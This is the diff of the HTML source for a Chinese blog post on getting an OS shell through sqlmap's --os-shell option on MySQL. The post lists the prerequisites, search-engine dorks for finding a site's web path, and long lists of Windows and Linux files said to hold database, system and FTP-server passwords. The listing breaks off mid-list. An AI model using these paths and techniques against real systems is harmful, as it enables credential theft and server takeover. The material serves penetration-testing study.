@@ -1,277 +1,159 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sqlmap关于os-shell小记 | yhy's blog</title><meta name="keywords" content="sqlmap使用,getshell"><meta name="author" content="yhy"><meta name="copyright" content="yhy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SqlMap –os-shell 利用MySQL前提条件 拥有dba权限  网站的绝对路径  高版本的mysql需要 show variables like &#39;%secure_file_priv%&#39; 或者select   @@secure;或者show global variables like &#39;%secure%&#39;;的结果符合要求，secure-file-priv">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap关于os-shell小记">
+<meta property="og:url" content="https://fireline.fun/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/index.html">
+<meta property="og:site_name" content="yhy&#39;s blog">
+<meta property="og:description" content="SqlMap –os-shell 利用MySQL前提条件 拥有dba权限  网站的绝对路径  高版本的mysql需要 show variables like &#39;%secure_file_priv%&#39; 或者select   @@secure;或者show global variables like &#39;%secure%&#39;;的结果符合要求，secure-file-priv">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fireline.fun/img/default.png">
+<meta property="article:published_time" content="2020-11-06T02:48:51.000Z">
+<meta property="article:modified_time" content="2021-03-05T01:53:35.747Z">
+<meta property="article:author" content="yhy">
+<meta property="article:tag" content="sqlmap使用">
+<meta property="article:tag" content="getshell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fireline.fun/img/default.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fireline.fun/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqlmap关于os-shell小记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-05 09:53:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="yhy的个人博客">
-  <meta name="author" content="yhy">
-  <meta name="keywords" content="">
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  <title>sqlmap关于os-shell小记 - yhy&#39;s blog</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
     
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>YHY</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tools/">
-                <i class="iconfont icon-exp-fill"></i>
-                辅助工具
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="sqlmap关于os-shell小记">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-author" aria-hidden="true"></i>
-      yhy
-    </span>
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-11-06 10:48" pubdate>
-        2020年11月6日 上午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.6k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      21
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">sqlmap关于os-shell小记</h1>
-            
-              <p class="note note-info">
-                
-                  本文首发于微信公众号：<a target="_blank" href="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" rel="nofollow noopener noopener">谁不想当剑仙</a></br></br>本文最后更新于：2021年3月5日 上午
-                
-              </p>
-            
-            <div class="markdown-body">
-              <h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom@1.0.0.css"><link rel="stylesheet" href="/css/color@1.0.0.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tasklist/"><i class="fa-fw fab fa-battle-net"></i><span> 杀软辅助</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yhy's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tasklist/"><i class="fa-fw fab fa-battle-net"></i><span> 杀软辅助</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap关于os-shell小记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-06T02:48:51.000Z" title="发表于 2020-11-06 10:48:51">2020-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-05T01:53:35.747Z" title="更新于 2021-03-05 09:53:35">2021-03-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqlmap关于os-shell小记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
 <li><p>拥有dba权限</p>
 </li>
 <li><p>网站的绝对路径</p>
@@ -297,7 +179,7 @@
 <li><p>通过网站报错信息查看绝对路径</p>
 </li>
 <li><p>通过搜索引擎获取</p>
- <figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">google语法：site:baidu.<span class="hljs-keyword">com</span> warning<br>site:baidu.<span class="hljs-keyword">com</span>  <span class="hljs-string">&quot;fatal error&quot;</span><br></code></pre></div></td></tr></table></figure></li>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">google语法：site:baidu.com warning</span><br><span class="line">site:baidu.com  &quot;fatal error&quot;</span><br></pre></td></tr></table></figure></li>
 <li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p>
 </li>
 </ol>
@@ -307,15 +189,15 @@
 <ul>
 <li><p><strong>win 下常见的敏感文件</strong></p>
 <p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">c:/boot.ini //查看系统版本 <br>c:/windows/php.ini //php配置信息 <br>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 <br>c:/winnt/php.ini <br>c:/winnt/my.ini <br>c:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD //存储了mysql.user表中的数据库连接密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini //存储了虚拟主机网站路径和密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml 查看IIS的虚拟主机配置 <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>am //存储了WINDOWS系统初次安装的密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span class="hljs-symbol">\S</span>ervUDaemon.exe <br>C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>ll Users<span class="hljs-symbol">\A</span>pplication Data<span class="hljs-symbol">\S</span>ymantec<span class="hljs-symbol">\p</span>cAnywhere<span class="hljs-symbol">\*</span>.cif文件 <br>//存储了pcAnywhere的登陆密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\A</span>pache Group<span class="hljs-symbol">\A</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf 或C:<span class="hljs-symbol">\a</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf //查看WINDOWS系统apache文件 <br>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. <br>c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 <br>d:<span class="hljs-symbol">\A</span>PACHE<span class="hljs-symbol">\A</span>pache2<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf <br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\m</span>y.ini <br>C:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD 存在MYSQL系统中的用户密码<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\p</span>hp.ini      php配置文件<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml    IIS虚拟主机配置文件<br></code></pre></div></td></tr></table></figure></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c:&#x2F;boot.ini &#x2F;&#x2F;查看系统版本 </span><br><span class="line">c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息 </span><br><span class="line">c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span><br><span class="line">c:&#x2F;winnt&#x2F;php.ini </span><br><span class="line">c:&#x2F;winnt&#x2F;my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码 </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini &#x2F;&#x2F;存储了虚拟主机网站路径和密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUAdmin.exe &#x2F;&#x2F;6.0版本以前的serv-u管理员密码存储于此 </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 </span><br><span class="line">&#x2F;&#x2F;存储了pcAnywhere的登陆密码 </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf &#x2F;&#x2F;查看WINDOWS系统apache文件 </span><br><span class="line">c:&#x2F;Resin-3.0.14&#x2F;conf&#x2F;resin.conf &#x2F;&#x2F;查看jsp开发的网站 resin文件配置信息. </span><br><span class="line">c:&#x2F;Resin&#x2F;conf&#x2F;resin.conf&#x2F;usr&#x2F;local&#x2F;resin&#x2F;conf&#x2F;resin.conf 查看linux系统配置的JSP虚拟主机 </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line">c:\windows\php.ini      php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml    IIS虚拟主机配置文件</span><br></pre></td></tr></table></figure></li>
 <li><p><strong>Linux 下常见的敏感文件</strong></p>
-<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//apache2缺省配置文件 </span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/etc/sysconfig/iptables <span class="hljs-comment">//从中得到防火墙规则策略 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// apache配置文件 </span><br>/etc/rsyncd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//同步程序配置文件 </span><br>/etc/my.cnf <span class="hljs-comment">//mysql的配置文件 </span><br>/etc/redhat-release <span class="hljs-comment">//系统版本 </span><br>/etc/issue <br>/etc/issue.<span class="hljs-keyword">net</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件<br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span 